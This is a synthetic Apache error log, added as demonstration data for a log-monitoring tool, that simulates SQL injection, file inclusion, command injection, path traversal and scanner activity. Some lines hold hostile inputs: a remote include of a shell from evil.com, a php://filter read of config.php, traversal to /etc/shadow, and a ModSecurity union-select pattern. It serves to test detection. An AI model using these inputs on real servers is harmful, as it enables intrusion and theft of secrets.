@@ -1,0 +1,41 @@
+# Log Sentinel v2.0 - Apache Error Log de Demonstração
+# Simula erros de um servidor Apache com ataques
+
+[Fri Jan 31 09:00:01.123456 2025] [core:error] [pid 1234] [client 192.168.1.10:52341] AH00126: Invalid URI in request GET /index.html HTTP/1.1
+[Fri Jan 31 09:05:02.234567 2025] [core:notice] [pid 1234] AH00094: Command line: '/usr/sbin/apache2'
+
+# === SQL INJECTION ERRORS ===
+[Fri Jan 31 09:10:01.345678 2025] [php:error] [pid 1235] [client 10.0.0.100:52400] PHP Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 in /var/www/html/search.php:45
+[Fri Jan 31 09:10:02.456789 2025] [php:error] [pid 1236] [client 10.0.0.100:52401] PHP Warning: mysqli_query(): in /var/www/html/login.php:23 - You have an error in your SQL syntax
+[Fri Jan 31 09:10:03.567890 2025] [php:error] [pid 1237] [client 10.0.0.100:52402] PHP Fatal error: mysql_query() expects parameter 1 to be string, array given in /var/www/html/users.php:89
+
+# === FILE INCLUSION ERRORS ===
+[Fri Jan 31 09:15:01.678901 2025] [php:error] [pid 1238] [client 10.0.0.101:52500] PHP Warning: include(/etc/passwd): failed to open stream: Permission denied in /var/www/html/page.php:12
+[Fri Jan 31 09:15:02.789012 2025] [php:error] [pid 1239] [client 10.0.0.101:52501] PHP Warning: file_get_contents(http://evil.com/shell.txt): failed to open stream in /var/www/html/include.php:34
+[Fri Jan 31 09:15:03.890123 2025] [php:error] [pid 1240] [client 10.0.0.101:52502] PHP Warning: include(php://filter/convert.base64-encode/resource=config.php): failed in /var/www/html/load.php:56
+
+# === COMMAND INJECTION ERRORS ===
+[Fri Jan 31 09:20:01.901234 2025] [cgi:error] [pid 1241] [client 10.0.0.102:52600] AH01215: /bin/sh: 1: cat: not found: /var/www/cgi-bin/ping.cgi
+[Fri Jan 31 09:20:02.012345 2025] [cgi:error] [pid 1242] [client 10.0.0.102:52601] AH01215: sh: wget: command not found: /var/www/cgi-bin/exec.cgi
+
+# === ACCESS DENIED (Path Traversal Attempts) ===
+[Fri Jan 31 09:25:01.123456 2025] [core:error] [pid 1243] [client 10.0.0.103:52700] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/../../etc/passwd
+[Fri Jan 31 09:25:02.234567 2025] [core:error] [pid 1244] [client 10.0.0.103:52701] AH00037: Symbolic link not allowed: /var/www/html/../../../etc/shadow
+[Fri Jan 31 09:25:03.345678 2025] [authz_core:error] [pid 1245] [client 10.0.0.103:52702] AH01630: client denied by server configuration: /var/www/html/admin/
+
+# === MOD_SECURITY BLOCKS ===
+[Fri Jan 31 09:30:01.456789 2025] [security2:error] [pid 1246] [client 10.0.0.104:52800] ModSecurity: Access denied with code 403 (phase 2). Matched "Operator `Rx' with parameter `(?i:union.*select)' against variable `ARGS:q'
+[Fri Jan 31 09:30:02.567890 2025] [security2:error] [pid 1247] [client 10.0.0.104:52801] ModSecurity: Access denied with code 403 (phase 2). Matched phrase "<script" at ARGS:content
+[Fri Jan 31 09:30:03.678901 2025] [security2:error] [pid 1248] [client 10.0.0.104:52802] ModSecurity: Access denied with code 403. SQL Injection attack detected
+
+# === SCANNER ACTIVITY ===
+[Fri Jan 31 09:35:01.789012 2025] [core:error] [pid 1249] [client 10.0.0.105:52900] AH00128: File does not exist: /var/www/html/.git/config
+[Fri Jan 31 09:35:02.890123 2025] [core:error] [pid 1250] [client 10.0.0.105:52901] AH00128: File does not exist: /var/www/html/.env
+[Fri Jan 31 09:35:03.901234 2025] [core:error] [pid 1251] [client 10.0.0.105:52902] AH00128: File does not exist: /var/www/html/wp-admin
+[Fri Jan 31 09:35:04.012345 2025] [core:error] [pid 1252] [client 10.0.0.105:52903] AH00128: File does not exist: /var/www/html/phpmyadmin
+[Fri Jan 31 09:35:05.123456 2025] [core:error] [pid 1253] [client 10.0.0.105:52904] AH00128: File does not exist: /var/www/html/backup.sql
+
+# === NORMAL ERRORS ===
+[Fri Jan 31 10:00:01.234567 2025] [php:notice] [pid 1254] [client 192.168.1.20:53000] PHP Notice: Undefined index: page in /var/www/html/nav.php:15
+[Fri Jan 31 10:30:02.345678 2025] [core:warn] [pid 1255] AH00045: child process 1234 still did not exit, sending a SIGTERM
+[Fri Jan 31 11:00:03.456789 2025] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operations
